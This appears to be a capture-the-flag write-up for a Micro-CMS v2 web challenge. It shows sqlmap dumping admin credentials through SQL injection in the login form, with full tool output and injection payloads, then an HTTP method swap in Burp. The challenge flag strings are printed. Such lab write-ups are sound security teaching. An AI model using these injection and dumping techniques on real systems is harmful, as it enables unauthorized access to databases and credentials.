## Flag 0

#### Hints

```
Flag0 -- Found
Regular users can only see public pages
Getting admin access might require a more perfect union
Knowing the password is cool, but there are other approaches that might be easier
```

The second hint makes it look like there is an SQL injection attack possible.

So on the input field I try to give the input as admin'  and it throws away an exception 

Now I know that there is a difficult way where we can modify the query and try to get the username and password, but well, sqlmap :laughing:  :smirk: 

So I used sqlmap to dump the database 

```bash
sqlmap -u "http://istance-ip/instance-id/login" --method "POST" --data "username=admin&password=admin" -p "username" --dump --random-agent
```

And the output was 

```bash
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:49:21 /2019-03-26/

[05:49:21] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.12 (KHTML, like Gecko) Chrome/9.0.579.0 Safari/534.12' from file '/usr/share/sqlmap/txt/user-agents.txt'
[05:49:21] [INFO] resuming back-end DBMS 'mysql' 
[05:49:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=admin' OR NOT 6124=6124#&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 6194 FROM(SELECT COUNT(*),CONCAT(0x7170717a71,(SELECT (ELT(6194=6194,1))),0x716b6a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ESwv&password=admin

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=admin' OR SLEEP(5)-- ZVXb&password=admin
---
[05:49:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0
[05:49:22] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[05:49:22] [INFO] fetching current database
[05:49:22] [INFO] resumed: 'level2'
[05:49:22] [INFO] fetching tables for database: 'level2'
[05:49:22] [INFO] used SQL query returns 2 entries
[05:49:22] [INFO] resumed: 'admins'
[05:49:22] [INFO] resumed: 'pages'
[05:49:22] [INFO] fetching columns for table 'admins' in database 'level2'
[05:49:22] [INFO] used SQL query returns 3 entries
[05:49:22] [INFO] resumed: 'id'
[05:49:22] [INFO] resumed: 'int(11)'
[05:49:22] [INFO] resumed: 'username'
[05:49:22] [INFO] resumed: 'varchar(256)'
[05:49:22] [INFO] resumed: 'password'
[05:49:22] [INFO] resumed: 'varchar(256)'
[05:49:22] [INFO] fetching entries for table 'admins' in database 'level2'
[05:49:22] [INFO] used SQL query returns 1 entry
[05:49:22] [INFO] resumed: '1'
[05:49:22] [INFO] resumed: 'josie'
[05:49:22] [INFO] resumed: 'matilde'
Database: level2
Table: admins
[1 entry]
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | matilde  | josie    |
+----+----------+----------+

[05:49:22] [INFO] table 'level2.admins' dumped to CSV file '/home/elli0t/.sqlmap/output/35.196.135.216/dump/level2/admins.csv'
[05:49:22] [INFO] fetching columns for table 'pages' in database 'level2'
[05:49:22] [INFO] used SQL query returns 4 entries
[05:49:22] [INFO] resumed: 'id'
[05:49:22] [INFO] resumed: 'int(11)'
[05:49:22] [INFO] resumed: 'public'
[05:49:22] [INFO] resumed: 'tinyint(1)'
[05:49:22] [INFO] resumed: 'title'
[05:49:22] [INFO] resumed: 'varchar(256)'
[05:49:22] [INFO] resumed: 'body'
[05:49:22] [INFO] resumed: 'mediumtext'
[05:49:22] [INFO] fetching entries for table 'pages' in database 'level2'
[05:49:22] [INFO] used SQL query returns 3 entries
[05:49:22] [INFO] resumed: '## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user...
[05:49:22] [INFO] resumed: '1'
[05:49:22] [INFO] resumed: '1'
[05:49:22] [INFO] resumed: 'Micro-CMS Changelog'
[05:49:22] [INFO] resumed: 'Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520...
[05:49:22] [INFO] resumed: '2'
[05:49:22] [INFO] resumed: '1'
[05:49:22] [INFO] resumed: 'Markdown Test'
[05:49:22] [INFO] resumed: 'My secret is ^FLAG^17998f64337742c97e3d3102953c873bc7d0357c5b26874a1f48d7b8643e52c6$FLAG$'
[05:49:22] [INFO] resumed: '3'
[05:49:22] [INFO] resumed: '0'
[05:49:22] [INFO] resumed: 'Private Page'
Database: level2
Table: pages
[3 entries]
+----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
| id | body                                                                                                                                                                                                                                                                                                                           | title               | public |
+----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+
| 1  | ## Version 2\\nThis version fixed the multitude of security flaws and general functionality bugs that plagued v1.  Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20.  By default, users need to be an admin to add or edit pages now.\\n | Micro-CMS Changelog | 1      |
| 2  | Just testing some markdown functionality.\\n\\n![adorable kitten](https://static1.squarespace.com/static/54e8ba93e4b07c3f655b452e/t/56c2a04520c64707756f4267/1493764650017/)\\n\\n<button>Some button</button>                                                                                                                 | Markdown Test       | 1      |
| 3  | My secret is ^FLAG^17998f64337742c97e3d3102953c873bc7d0357c5b26874a1f48d7b8643e52c6$FLAG$                                                                                                                                                                                                                                      | Private Page        | 0      |
+----+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+--------+

[05:49:22] [INFO] table 'level2.pages' dumped to CSV file '/home/elli0t/.sqlmap/output/35.196.135.216/dump/level2/pages.csv'
[05:49:22] [INFO] fetched data logged to text files under '/home/elli0t/.sqlmap/output/35.196.135.216'

[*] ending @ 05:49:22 /2019-03-26/
```



Okay, I received one of the flags in the Dump. 

Lets submit it. 

Lol that flag is the Flag 2

Anyways, Lets login  using the id:password

We get the Flag 0 

`^FLAG^0e0e3518a9d732b9b3ee9f8be705edf7e23ea6b0a37efc2672c42bc3ac3d11b2$FLAG$`

## Flag 1

`^FLAG^d7d9424b77235dcf8feaa55b99cb009e418421ee5d15e6f3968bdcb7164c3422$FLAG$`

#### Hints 

```
Flag1 -- Not Found
What actions could you perform as a regular user on the last level, which you can't now?
Just because request fails with one method doesn't mean it will fail with a different method
```

So the difference from the last v1 to this v2 is the fact that we can not edit the page. 

The url for the edit page was something like -- /page/edit/pageno

Let us capture the request in Burp, and  change the method from GET to POST and voila, we found our FLAG !!